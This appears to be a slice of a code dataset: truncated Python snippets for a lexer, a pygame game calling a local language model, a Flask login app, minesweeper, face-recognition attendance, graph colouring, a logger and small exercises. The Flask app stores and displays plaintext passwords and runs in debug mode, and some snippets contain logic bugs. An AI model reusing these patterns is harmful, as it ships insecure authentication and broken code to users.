'THREAD'\n}\n\n# Tokens definition\ntokens = ['INT', 'FLOAT', 'STRING', 'ALIGNMENT', 'SIZE', 'IDENTIFIER', 'KEYWORD'] + list(reserved.values()) \n\nliterals = ['*', '+', '-', '%', '/', '&', '!', '~', '|', '^', '=', ',', '(', ')', '{', '}']\n\n\n@TOKEN(identifier)\ndef  t_IDENTIFIER(t):\n    if  t.value in reserved:\n        t.type = reserved.get(t.value,'KEYWORD') \n    else:\n        t.type = 'IDENTIFIER'\n    return t\n\n@TOKEN(keywordr)\ndef t_KEYWORD(t):\n    t.type = reserved.get(t.value,'KEYWORD')    # Check for reserved word",
    "# AI Invaders by 2 Acre Studios\nimport pygame\nimport random\nimport sys\nimport requests\nimport threading\nimport json\nimport re\n\npygame.init()\n\n# Constants\nSCREEN_WIDTH, SCREEN_HEIGHT = 800, 600\nPLAYER_SIZE = 50\nENEMY_SIZE = 40\nBULLET_SIZE = 5\nBULLET_SPEED = 15\nENEMY_BULLET_SPEED = 5\nSTART_ENEMY_SPEED = 2\nMOVE_DOWN_STEP = 10\nLEVEL_CHANGE_INCREASE = 0.5\nGAME_OVER_Y = SCREEN_HEIGHT - 100\nSHOOTING_FREQUENCY = 120\n\n# Colors\nCOLOR_WHITE = (255, 255, 255)\nCOLOR_GREEN = (0, 255, 0)\nCOLOR_RED = (255, 0, 0)\nCOLOR_BLUE = (0, 0, 255)\nCOLOR_YELLOW = (255, 255, 0)\nCOLOR_PURPLE = (128, 0, 128)\nCOLOR_CYAN = (0, 255, 255)\nCOLOR_ORANGE = (255, 165, 0)\nCOLOR_PINK = (255, 20, 147)\nCOLOR_SILVER = (192, 192, 192)\n\n# Screen setup\nscreen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))\npygame.display.set_caption('AI Invaders')\n\n# Player setup\nplayer_pos = [SCREEN_WIDTH // 2, SCREEN_HEIGHT - 60]\n\n# Enemy setup\ndef initialize_invaders():\n    invaders = []\n    for row in range(4):\n        for col in range(10):\n            x = col * (ENEMY_SIZE + 20) + 100\n            y = row * (ENEMY_SIZE + 20) + 50\n            invaders.append([x, y])\n    return invaders\n\ninvaders = initialize_invaders()\ndirection = 1\nenemy_speed = START_ENEMY_SPEED\nlevel = 1\nscore = 0\n\n# Bullet setups\nplayer_bullets = []\nenemy_bullets = []\n\n# Font setup\nfont = pygame.font.SysFont('consolas', 20)\n\n# Shape and Color details\ndef get_level_details(level):\n    shapes = {\n        1: (\"rectangle\", COLOR_RED),\n        2: (\"circle\", COLOR_BLUE),\n        3: (\"triangle\", COLOR_GREEN),\n        4: (\"rectangle\", COLOR_PURPLE),\n        5: (\"circle\", COLOR_YELLOW),\n        6: (\"triangle\", COLOR_ORANGE),\n        7: (\"rectangle\", COLOR_PINK),\n        8: (\"circle\", COLOR_CYAN),\n        9: (\"triangle\", COLOR_SILVER),\n        10: (\"rectangle\", COLOR_WHITE)\n    }\n    return shapes[(level - 1) % len(shapes) + 1]\n\n# Draw shapes based on type and color\ndef draw_shape(screen, shape_type, color, x, y):\n    if shape_type == \"rectangle\":\n        pygame.draw.rect(screen, color, (x, y, ENEMY_SIZE, ENEMY_SIZE))\n    elif shape_type == \"circle\":\n        pygame.draw.circle(screen, color, (x + ENEMY_SIZE // 2, y + ENEMY_SIZE // 2), ENEMY_SIZE // 2)\n    elif shape_type == \"triangle\":\n        points = [(x, y + ENEMY_SIZE), (x + ENEMY_SIZE // 2, y), (x + ENEMY_SIZE, y + ENEMY_SIZE)]\n        pygame.draw.polygon(screen, color, points)\n\ndef draw_elements():\n    global level\n    shape, invader_color = get_level_details(level)\n    pygame.draw.rect(screen, COLOR_GREEN, (player_pos[0], player_pos[1], PLAYER_SIZE, PLAYER_SIZE))\n    for bullet in player_bullets:\n        pygame.draw.rect(screen, COLOR_WHITE, (bullet[0], bullet[1], BULLET_SIZE, BULLET_SIZE))\n    for bullet in enemy_bullets:\n        pygame.draw.rect(screen, invader_color, (bullet[0], bullet[1], BULLET_SIZE, BULLET_SIZE))\n    for invader in invaders:\n        x, y = invader\n        draw_shape(screen, shape, invader_color, x, y)\n\ndef draw_invaders_row(y_position):\n    num_invaders = 10  # Number of Invaders to draw\n    invader_spacing = (SCREEN_WIDTH - (num_invaders * ENEMY_SIZE)) // (num_invaders + 1)  # Calculate spacing\n\n    for i in range(num_invaders):\n        shape, color = get_level_details(i + 1)  # Get shape and color for each level\n        x_position = invader_spacing + i * (ENEMY_SIZE + invader_spacing)  # Calculate x position\n\n        # Draw each invader based on its shape at the given y_position\n        draw_shape(screen, shape, color, x_position, y_position)\n\ndef fetch_ai_message_for_game_over():\n    \"\"\"Fetch a dynamic game-over message from the AI model, commenting on the player's score.\"\"\"\n    prompt = f\"Say something to the player about their performance based on them scoring {score} points in the game against you as the Invaders. An average score is 300 points.\"\n    try:\n        response = requests.post(\n            \"http://localhost:11434/api/generate\",\n            json={'model': 'gemma:2b-instruct', 'prompt': prompt}\n        )\n        response.raise_for_status()\n\n        # Initialize an empty string to accumulate messages\n        complete_message = \"\"\n        lines = response.text.strip().split('\\n')\n        for line in lines:\n            try:\n                data = json.loads(line)\n                # Check if the 'done' flag is True, if so, break the loop\n                if data.get('done', False):\n                    break\n                # Append each part of the message to the complete_message string\n                complete_message += data.get('response', '')  # Extract the response part\n            except json.JSONDecodeError:\n                print(\"Failed to parse JSON from line:\", line)\n                continue\n\n        # If complete_message is empty after the loop, provide a default message\n        if not complete_message:\n            return \"Thank you for playing! No dynamic message available.\"\n        return complete_message.strip()\n\n    except requests.RequestException as e:\n        print(f\"Error fetching AI messag",
    "from flask import Flask, render_template, request, redirect, url_for, session, flash\nimport sqlite3\nimport os\n\napp = Flask(__name__)\napp.secret_key = os.urandom(24)\n\nDATABASE = 'whitelist.db'\n\n# \u6570\u636e\u5e93\ndef create_table():\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute('''CREATE TABLE IF NOT EXISTS users (\n                 id INTEGER PRIMARY KEY AUTOINCREMENT,\n                 username TEXT,\n                 password TEXT,\n                 is_admin INTEGER DEFAULT 0\n                 )''')\n    conn.commit()\n    conn.close()\n\n# \u767d\u540d\u5355\u8def\u5f84\nimport  json\nWHITELIST_PATH = 'G:\\server\\whitelist.json'\n\n# \u6dfb\u52a0\u5230\u767d\u540d\u5355\ndef add_to_whitelist(username):\n    with open(WHITELIST_PATH, 'r+') as f:\n        whitelist = json.load(f)\n        whitelist.append(username)\n        f.seek(0)\n        json.dump(whitelist, f)\n\n\n\n\n# \u8bbe\u7f6e\u9759\u6001\u6587\u4ef6\u76ee\u5f55\u4e3a \"static\" \u6587\u4ef6\u5939\napp.static_folder = 'static'\n\n\n# \u4e3b\u9875\n@app.route('/')\ndef index():\n    if 'username' in session:\n        return redirect(url_for('dashboard'))\n    return render_template('index.html')\n    \n    \n    \n# \u6ce8\u518c\n@app.route('/register', methods=['GET', 'POST'])\ndef register():\n    if request.method == 'POST':\n        username = request.form['username']\n        password = request.form['password']\n\n        conn = sqlite3.connect(DATABASE)\n        c = conn.cursor()\n        # \u5728\u63d2\u5165\u7528\u6237\u4fe1\u606f\u65f6\uff0c\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u7ba1\u7406\u5458\u5c5e\u6027\u4e3a 0\uff08\u975e\u7ba1\u7406\u5458\uff09\n        c.execute(\"INSERT INTO users (username, password, is_admin) VALUES (?, ?, ?)\", (username, password, 0))\n        conn.commit()\n        conn.close()\n\n        add_to_whitelist(username)\n\n        flash('Registered successfully!', 'success')\n        return redirect(url_for('register_success'))\n\n    return render_template('register.html')\n\n    \n# \u6ce8\u518c\u6210\u529f\n@app.route('/register_success')\ndef register_success():\n    return render_template('register_success.html')    \n    \n    \n    \n# \u767b\u5f55\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        username = request.form['username']\n        password = request.form['password']\n\n        conn = sqlite3.connect(DATABASE)\n        c = conn.cursor()\n        c.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))\n        user = c.fetchone()\n        conn.close()\n\n        if user:\n            session['username'] = username\n            flash('Logged in successfully!', 'success')\n            return redirect(url_for('dashboard'))\n        else:\n            flash('Invalid username or password. Please try again.', 'danger')\n\n    return render_template('login.html')\n    \n    \n    \n    \n# \u7528\u6237\u4e3b\u9875\n@app.route('/dashboard')\ndef dashboard():\n    if 'username' not in session:\n        return redirect(url_for('login'))\n\n    return render_template('dashboard.html', username=session['username'])\n    \n    \n# \u767b\u51fa\n@app.route('/logout')\ndef logout():\n    session.pop('username', None)\n    return redirect(url_for('index'))\n\n\n# \u7ba1\u7406\u5458\n# Admin \u8def\u7531\n@app.route('/admin')\ndef admin():\n    if 'username' not in session:\n        return redirect(url_for('login'))\n\n    # Check if current user is admin\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT is_admin FROM users WHERE username = ?\", (session['username'],))\n    is_admin = c.fetchone()[0]\n    conn.close()\n\n    if not is_admin:\n        flash('You do not have permission to access this page.', 'danger')\n        return redirect(url_for('index'))\n\n    # Fetch user list\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT id, username, password FROM users\")  # \u4fee\u6539\u67e5\u8be2\u8bed\u53e5\u4ee5\u5305\u542b\u5bc6\u7801\n    users = c.fetchall()\n    print(users)  # \u6253\u5370\u7528\u6237\u5217\u8868\n    conn.close()\n\n    return render_template('admin.html', users=users)\n\n\n# \u5220\u9664\u529f\u80fd\n# \u5220\u9664\u7528\u6237\u8def\u7531\n@app.route('/admin/delete/<int:user_id>', methods=['POST'])\ndef delete_user(user_id):\n    if 'username' not in session:\n        return redirect(url_for('login'))\n\n    # \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u7ba1\u7406\u5458\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"SELECT is_admin FROM users WHERE username = ?\", (session['username'],))\n    is_admin = c.fetchone()[0]\n    conn.close()\n\n    if not is_admin:\n        flash('\u60a8\u6ca1\u6709\u6743\u9650\u8bbf\u95ee\u8be5\u9875\u9762\u3002', 'danger')\n        return redirect(url_for('index'))\n\n    # \u4ece\u6570\u636e\u5e93\u4e2d\u5220\u9664\u7528\u6237\n    conn = sqlite3.connect(DATABASE)\n    c = conn.cursor()\n    c.execute(\"DELETE FROM users WHERE id = ?\", (user_id,))\n    conn.commit()\n    conn.close()\n\n    flash('\u7528\u6237\u5220\u9664\u6210\u529f\uff01', 'success')\n    return redirect(url_for('admin'))\n\n\nif __name__ == '__main__':\n    create_table()\n    app.run(debug=True)\n\n\n",
    "import time\r\nimport os\r\nimport datetime\r\nimport pygame\r\nimport linecache\r\nimport colorama\r\nfrom colorama import Fore, Back\r\nimport glob\r\nimport random\r\n\r\npygame.init()\r\ncolorama.init()\r\n\r\nglobal start\r\n\r\ntry:\r\n    start = pygame.mixer.Sound(\"boot.mp3\")\r\n    tape = pygame.mixer.Sound(\"background.mp3\")\r\nexcept:\r\n    pass\r\n\r\norange = '\\x1b[38;2;255;165;0m'\r\n\r\nBLINK = '\\033[5m'  # ANSI escape sequence for blinking\r\nRESET = '\\033[0m'  # ANSI escape sequence to reset formatting\r\n\r\n\r\n\r\ndef reset():\r\n    if os.name == 'nt':\r\n        os.system('cls')\r\n    else:\r\n        os.system('clear')\r\n\r\n#This makes all text orange\r\nprint(orange)\r\n\r\ndef minesweeper():\r\n    def create_board(dim_size, num_mines):\r\n        board = [[0 for _ in range(dim_size)] for _ in range(dim_size)]\r\n        mines_planted = 0\r\n        while mines_planted < num_mines:\r\n            loc = random.randint(0, dim_size**2 - 1)\r\n            row, col = divmod(loc, dim_size)\r\n\r\n            if board[row][col] == '*':\r\n                continue\r\n            \r\n            board[row][col] = '*'  # Plant mine\r\n            mines_planted += 1\r\n\r\n        return board\r\n\r\n    def add_numbers(board):\r\n        dim_size = len(board)\r\n        directions = [(-1, -1), (-1, 0), (-1, 1),\r\n                    (0, -1),         (0, 1),\r\n                    (1, -1), (1, 0), (1, 1)]\r\n\r\n        for row in range(dim_size):\r\n            for col in range(dim_size):\r\n                if board[row][col] == '*':\r\n                    continue\r\n                mine_count = 0\r\n                for dr, dc in directions:\r\n                    r, c = row + dr, col + dc\r\n                    if 0 <= r < dim_size and 0 <= c < dim_size and board[r][c] == '*':\r\n                        mine_count += 1\r\n                board[row][col] = mine_count\r\n\r\n    def print_board(board):\r\n        for row in board:\r\n            print(\" \".join(str(cell) for cell in row))\r\n\r\n    def play(dim_size=10, num_mines=20):\r\n        board = create_board(dim_size, num_mines)\r\n        add_numbers(board)\r\n        safe_spots = dim_size * dim_size - num_mines\r\n        uncovered_spots = 0\r\n        revealed_board = [[' ' for _ in range(dim_size)] for _ in range(dim_size)]\r\n\r\n        while True:\r\n            print_board(revealed_board)\r\n            try:\r\n                row, col = map(int, input(\"Enter row and column to reveal: \").split())\r\n                if str(row) == \"back\" or str(col) == \"back\":\r\n                    termilink()\r\n                reset()\r\n                assert 0 <= row < dim_size and 0 <= col < dim_size\r\n            except (ValueError, AssertionError):\r\n                print(\"Invalid input. Please use zero-based index.\")\r\n                continue\r\n\r\n            if board[row][col] == '*':\r\n                print(\"Game Over!\")\r\n                print_board(board)  # Reveal the board\r\n                break\r\n\r\n            revealed_board[row][col] = str(board[row][col])\r\n            uncovered_spots += 1\r\n\r\n            if uncovered_spots == safe_spots:\r\n                print(\"Congratulations! You have won!\")\r\n                termilink()\r\n                break\r\n\r\n    if __name__ == \"__main__\":\r\n        play()\r\n\r\n\r\ndef termilink():\r\n    print(R\" .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.\")\r\n    time.sleep(0.1)\r\n    reset()\r\n\r\n    print(R\" .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.\")\r\n    print(R\"| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |\")\r\n\r\n    time.sleep(0.1)\r\n    reset()\r\n\r\n    print(R\" .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.\")\r\n    print(R\"| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |\")\r\n    print(R\"| |  _________   | || |  _________   | || |  _______     | || | ____    ____ | || |   _____      | || |     _____    | || | ____  _____  | || |  ___  ____   | |\")\r\n\r\n    time.sleep(0.1)\r\n    reset()\r\n\r\n    print(R\" .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .-----------------. .----------------.\")\r\n    print(R\"| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |\")\r\n    print(R\"| |  _________   | || |  _________   | || |  _______     | || | ____    ____ | || |   _____      | || |     _____    | || | ____  _____  | || |  ___  ____   | |\")\r\n    print(R\"| | |  _   _  |  | || | |_   ___  |  | || | |_   __ \\    | || ||_   \\  /   _|| || |  |_   _|     | || |    |_   _|   |",
    "import numpy as np\nimport cv2\nimport torch\nfrom facenet_pytorch import MTCNN\nfrom facenet_pytorch import InceptionResnetV1\nfrom sklearn.ensemble import RandomForestClassifier\nimport joblib\nimport datetime as dt\nimport pandas as pd\nimport paho.mqtt.client as mqtt\nimport RPi.GPIO as GPIO\nimport time\n\nclass FaceRecognition:\n    def __init__(self):\n        # Load models and resources\n        self.mtcnn = MTCNN(thresholds=[0.9, 0.9, 0.9])\n        self.facenet_model = InceptionResnetV1(pretrained='vggface2').eval()\n        self.clf = joblib.load(\"/Users/sagarkumbhar/Documents/TLC_Polymers_Ltd./classifiers/randomForest/randomforestClassifier.joblib\")\n        self.label_to_name = {0: 'A39 Akash Khulpe',  1: 'A56 Anuj Gavhane', 2:'A50 Devang Edle', 3:'A51 Deepanshu Gadling', \n                              4:'A45 Gaurav Diwedi', 5:'A41 Parimal Kumar', 6:'A40 Parth Deshpande',7:'A46 Rutuja Doiphode',\n                              8:'A47 Sagar Kumbhar'}\n        self.threshold = 0.7  \n        self.attendance_records = []\n        self.predicted_names = []\n        self.broker_address = \"localhost\"\n        self.topic = \"hello/world\"\n        self.client = mqtt.Client()\n        \n\n    def recognize_faces(self, frame):\n        \"\"\" This method takes frames and performs face recognition by detecting faces through MTCNN.\n        The detected face area from the frames is fed to FaceNet and embeddings are extracted.\n        After sucessfull identification of people the name and entry time are stored in a pandas \n        dataframe ans saved as a CSV file\"\"\"\n        \n        current_time = dt.datetime.now().strftime('%I: %M: %S %p')\n        boxes, _ = self.mtcnn.detect(frame) \n        \n        # checks whether bounding boxes(faces) are present in the frames\n        if boxes is not None: \n            faces = [] \n            face_boxes = [] \n            \n            for box in boxes: \n                x1, y1, x2, y2 = box.astype(int) \n                face = frame[y1:y2, x1:x2] \n                \n                if face.size != 0: \n                    face = cv2.resize(face, (160, 160)) \n                    face = torch.from_numpy(face).permute(2, 0, 1).float() \n                    face = (face - 127.5) / 128.0 \n                    faces.append(face) \n                    face_boxes.append((x1, y1, x2, y2)) \n                    \n            if len(faces) > 0:\n                # Convert faces list to a batch tensor\n                faces = torch.stack(faces)\n\n                # Generate embeddings for all faces in the batch\n                with torch.no_grad():\n                    embeddings = self.facenet_model(faces)\n\n                # Perform predictions on the embeddings\n                predictions = self.clf.predict(embeddings.numpy())\n                probabilities = self.clf.predict_proba(embeddings.numpy())\n\n                # Iterate over the predictions and draw bounding boxes\n                for prediction, probability, box in zip(predictions, probabilities, face_boxes):\n                    if probability.max() >= self.threshold:\n                        predicted_name = self.label_to_name[int(prediction)]\n                        #print(\"Predicted name:\", predicted_name)\n                        current_date = dt.datetime.now().strftime('%d-%m-%y')\n                        current_confidence = probability.max()\n                \n                        if not any(record['Name'] == predicted_name for record in self.attendance_records):\n                            # Append attendance record to the list\n                            self.attendance_records.append({'Name': predicted_name, 'Date': current_date, 'Time': current_time})\n                \n                        #uncomment this to see probability/confidence of each class\n                        #print(probabilities)  \n                \n                        cv2.putText(frame, predicted_name, (box[0], box[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.9,\n                                (36, 255, 12), 2)\n                        cv2.rectangle(frame, (box[0], box[1]), (box[2], box[3]), (0, 255, 0), 2)\n                    else:\n                        cv2.putText(frame, 'unknown person', (box[0], box[1] - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.9,\n                                (36, 255, 12), 2)\n                        cv2.rectangle(frame, (box[0], box[1]), (box[2], box[3]), (0, 255, 0), 2)\n                \n                    # Print all predicted names together\n                    self.predicted_names = [self.label_to_name[int(prediction)] if probability.max() >= self.threshold else 'unknown person' for prediction, probability in zip(predictions, probabilities)]\n                    #print(\"Predicted names:\", predicted_names)\n\n                    attendance_df = pd.DataFrame(self.attendance_records)\n\n                    # Save the DataFrame to a CSV file\n                    attendance_df.to_csv('attendance_records.csv', index=False)\n\n    \n    def run(self):\n        \"\"\" This method initializes the came",
    "class Graph:\n    def __init__(self, vertices):\n        self.V = vertices\n        self.graph = [[0 for _ in range(vertices)] for _ in range(vertices)]\n\n    # Function to check if the current color assignment is safe for vertex v\n    def is_safe(self, v, colour, c):\n        for i in range(self.V):\n            if self.graph[v][i] == 1 and colour[i] == c:\n                return False\n        return True\n\n    # Recursive function to solve graph coloring problem\n    def graph_colour_util(self, m, colour, v):\n        if v == self.V:\n            return True\n\n        for c in range(1, m + 1):\n            if self.is_safe(v, colour, c):\n                colour[v] = c\n                if self.graph_colour_util(m, colour, v + 1):\n                    return True\n                colour[v] = 0\n\n    # Main function to solve graph coloring problem\n    def graph_colouring(self, m):\n        colour = [0] * self.V\n        if not self.graph_colour_util(m, colour, 0):\n            print(\"Solution does not exist\")\n            return False\n\n        print(\"Solution exists and following are the assigned colors:\")\n        for c in colour:\n            print(c, end=\" \")\n\n        return True\n\n# Example usage:\ng = Graph(4)\ng.graph = [[0, 1, 1, 1],\n           [1, 0, 1, 0],\n           [1, 1, 0, 1],\n           [1, 0, 1, 0]]\n\nm = 3  # Number of colors\ng.graph_colouring(m)\n",
    "import datetime\nimport sys\nfrom pathlib import Path\nimport threading\nimport json\n\n__all__ = [\"Logger\"]\n\n# Custom Errors\nclass Errors:\n    \"\"\"Contains Custom Errors\"\"\"\n\n    class FileNotOpen(Exception):\n        \"\"\"FileNotOpen Error\"\"\"\n        \n\n    class PathNonExistent(Exception):\n        \"\"\"PathNonExistent Error\"\"\"\n        \n\n    class LevelNotSupported(Exception):\n        \"\"\"LevelNotSupported Error\"\"\"\n\n    class UnableToLock(Exception):\n        \"\"\"UnableToLock Error\"\"\"\n\n    class LockNonExistent(Exception):\n        \"\"\"LockNonExistent Error\"\"\"\n\nclass Logger:\n    \"\"\"\n        Initialize Logger instance.\n\n        Args:\n            output_dir (str, optional): the output location. Defaults to 'logs'.\n            log_file_type (str, optional): the file log type. Defaults to 'log'.\n            settings_path (str, optional): the settings path. Defaults to './log_settings.json'.\n            log_level (str, optional): the log level. Defaults to 'INFO'.\n\n        Raises:\n            ValueError: If the log file type isn't supported.\n            PathNonExistent: If the log file path does not exist.\n            FileNotOpen: If the log file is not open.\n            PathNonExistent: If the log settings file path does not exist.\n            UnableToLock: If the script is unable to get a thread lock.\n        \"\"\"\n    open_loggers_lock = threading.Lock()  # Lock for synchronizing access to open_loggers\n    open_loggers = {}  # Thread-safe dictionary to store open loggers\n\n    def __init__(self,\n                 output_dir: str = \"logs\",\n                 log_file_type: str = \"log\",\n                 settings_path: str = './log_settings.json',\n                 log_level: str = 'INFO'):\n        \"\"\"\n        Initialize Logger instance.\n\n        Args:\n            output_dir (str, optional): the output location. Defaults to 'logs'.\n            log_file_type (str, optional): the file log type. Defaults to 'log'.\n            settings_path (str, optional): the settings path. Defaults to './log_settings.json'.\n            log_level (str, optional): the log level. Defaults to 'INFO'.\n\n        Raises:\n            ValueError: If the log file type isn't supported.\n            PathNonExistent: If the log file path does not exist.\n            FileNotOpen: If the log file is not open.\n            PathNonExistent: If the log settings file path does not exist.\n            UnableToLock: If the script is unable to get a thread lock.\n        \"\"\"\n        self.lock = None\n\n        try:\n            # Attempt to create a thread lock\n            self.lock = threading.Lock()\n        except Exception as e:\n            # Raise an error if unable to create a thread lock\n            raise Errors.UnableToLock(f\"Unable to get process lock with error {e}\")\n\n        # Set log level to upper case\n        self.log_level = log_level.upper()\n\n        # Initialize variables\n        self.settings = None\n        self.configured_level_value = None\n        self.file_path = None\n        self.log_file = None\n        self.log_file_name = None\n        self.timestamp = None\n\n        # Assign values\n        self.timestamp = datetime.datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n        self.supported_formats = [\"log\", \"txt\"]\n        self.log_file_type = log_file_type if log_file_type in self.supported_formats else 'log'\n        self.file_path = Path.cwd().resolve() if output_dir == \".\" else Path(output_dir).resolve()\n        self.settings_path = settings_path\n        self.load_json(self.settings_path)\n        if self.settings:\n            self.configured_level_value = self.settings['LogLevels'][self.log_level]\n\n        # Create the log file\n        self.create_log_file()\n\n    def log(self, level: str, message: str, context=None):\n        \"\"\"\n        Make a new log to the log file.\n\n        Args:\n            level (str): The log level.\n            message (str): The log message.\n            context (dict, optional): Contextual information to be included in the log message.\n\n        Raises:\n            FileNotOpen: If log file is not open.\n            LockNonExistent: If the script doesn't have a lock.\n            FileNotOpen: If the log file is not open.\n        \"\"\"\n        timestamp = datetime.datetime.now().strftime(\"%Y-%m-%d-%H-%M-%S\")\n        level = level.upper()\n\n        if self.lock:\n            with self.lock:\n                if self.log_file:\n                    if self.settings:\n                        log_level_value = self.settings['LogLevels'][level]\n                        if log_level_value and self.configured_level_value:\n                            if log_level_value >= self.configured_level_value:\n                                if timestamp:\n                                    if context:\n                                        formatted_message = self.formatter(\n                                                                        level, message,\n                                                                           timestamp,\n                             ",
    "# 242. Valid Anagram\n\n# Given two strings s and t, return true if t is an anagram of s, and false otherwise.\n\n# An Anagram is a word or phrase formed by rearranging the letters of a different word or phrase, typically using all the original letters exactly once.\n\n \n\n# Example 1:\n\n# Input: s = \"anagram\", t = \"nagaram\"\n# Output: true\n# Example 2:\n\n# Input: s = \"rat\", t = \"car\"\n# Output: false\n \n\n# Constraints:\n\n# 1 <= s.length, t.length <= 5 * 104\n# s and t consist of lowercase English letters.\n \n\n# Follow up: What if the inputs contain Unicode characters? How would you adapt your solution to such a case?\n\n################################################################################################################################\n\n\n#First Attempt:\nclass Solution(object):\n    def isAnagram(self, s, t):\n        \"\"\"\n        :type s: str\n        :type t: str\n        :rtype: bool\n        \"\"\"\n        dic = {}\n        dic2 = {}\n        for i in s:\n            dic[i] = dic.get(i,0) + 1\n        for i in t:\n            dic2[i] = dic2.get(i,0) + 1\n        if len(dic) != len(dic2): return False\n        try:    \n            for k in dic:\n                if dic[k] != dic2[k]: return False\n        except: return False    \n        return True\n    ",
    "import re\n\n# Go through, then cleanup and add error codes! (After completed) #\ndef fix_equation(var):\n    if len(re.findall(r'\\b(x)\\b', var)) > 0:\n        var = re.sub(r'\\b(x)\\b', '1x', var)\n        if len(re.findall(r'\\b(y)\\b', var)) > 0:\n            var = re.sub(r'\\b(y)\\b', '1y', var)\n    return var\n\n\ndef error(n):\n    # Executes When error and points to error location\n    print(f'\\nError {n}')\n    print('\\nAn error has occured.')\n    input('Resetting program on enter key press...')\n    main()\n    exit(1)\n\n\ndef find_all_x_or_y(string):\n    all_x_or_y_in_string = ''\n    for charecter in string:\n        if charecter == 'x' or 'y':\n            all_x_or_y_in_string = all_x_or_y_in_string + charecter\n    return all_x_or_y_in_string\n\n\ndef find_all_numbers(string):\n    numbers = ''\n    for charecter in string:\n        if charecter == '-':\n            numbers = numbers + charecter\n        elif charecter.isdigit():\n            numbers = numbers + charecter\n    return numbers\n\n\ndef multiplication(var):\n    if len(re.findall(r'\\s\\*\\s', var)) > 0:\n        multiplcation_equation_variable = str(re.findall(r'\\b([^\\s]+)\\s\\*\\s([^\\s]+)\\b', var)).replace('[(', '').replace(')]', '').replace(\"'\", '').split(', ')\n        x_or_y_found = r\"\\b\\d*([^\\d]+)\\b\"\n        if len(re.findall(x_or_y_found, multiplcation_equation_variable[0])) > 0:\n            if len(re.findall(x_or_y_found, multiplcation_equation_variable[1])) > 0:\n                variable_0_variable_string = re.findall(x_or_y_found, multiplcation_equation_variable[0])[0]\n                variable_1_variable_string = re.findall(x_or_y_found, multiplcation_equation_variable[1])[0]\n                variable_0_number_value = re.findall(r'\\b(\\d*)', multiplcation_equation_variable[0])[0]\n                variable_1_number_value = re.findall(r'\\b(\\d*)', multiplcation_equation_variable[1])[0]\n                multiplication_equation = re.findall(r'(\\b[^\\s]+\\s\\*\\s[^\\s]+\\s)', var)[0]\n                if len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) == 0:\n                    var = var[:var.find(multiplication_equation)] + ' ' + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_0_variable_string + variable_1_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                    return var\n                elif len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) > 0:\n                    var = var[:var.find(multiplication_equation)] + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_0_variable_string + variable_1_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                    return var\n            else:\n                variable_0_variable_string = re.findall(x_or_y_found, multiplcation_equation_variable[0])[0]\n                variable_0_number_value = re.findall(r'\\b(\\d*)', multiplcation_equation_variable[0])[0]\n                variable_1_number_value = re.findall(r'\\b(\\d*)', multiplcation_equation_variable[1])[0]\n                multiplication_equation = re.findall(r'(\\b[^\\s]+\\s\\*\\s[^\\s]+\\s)', var)[0]\n                if len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) == 0:\n                    var = var[:var.find(multiplication_equation)] + ' ' + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_0_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                    return var\n                elif len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) > 0:\n                    var = var[:var.find(multiplication_equation)] + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_0_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                    return var\n        elif len(re.findall(x_or_y_found, multiplcation_equation_variable[1])) > 0:\n            variable_1_variable_string = re.findall(x_or_y_found, multiplcation_equation_variable[1])[0]\n            variable_0_number_value = re.findall(r\"\\b(\\d*)\", multiplcation_equation_variable[0])[0]\n            variable_1_number_value = re.findall(r\"\\b(\\d*)\", multiplcation_equation_variable[1])[0]\n            multiplication_equation = re.findall(r\"(\\b[^\\s]+\\s\\*\\s[^\\s]+\\s)\", var)[0]\n            if len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) == 0:\n                var = var[:var.find(multiplication_equation)] + ' ' + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_1_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                return var\n            elif len(re.findall(r'(\\s[^\\s]+\\s*\\s[^\\s]+\\s)', var)) > 0:\n                var = var[:var.find(multiplication_equation)] + str(int(variable_0_number_value) * int(variable_1_number_value)) + variable_1_variable_string + ' ' + var[var.find(multiplication_equation) + len(multiplication_equation):]\n                return var\n        else:\n            vari",
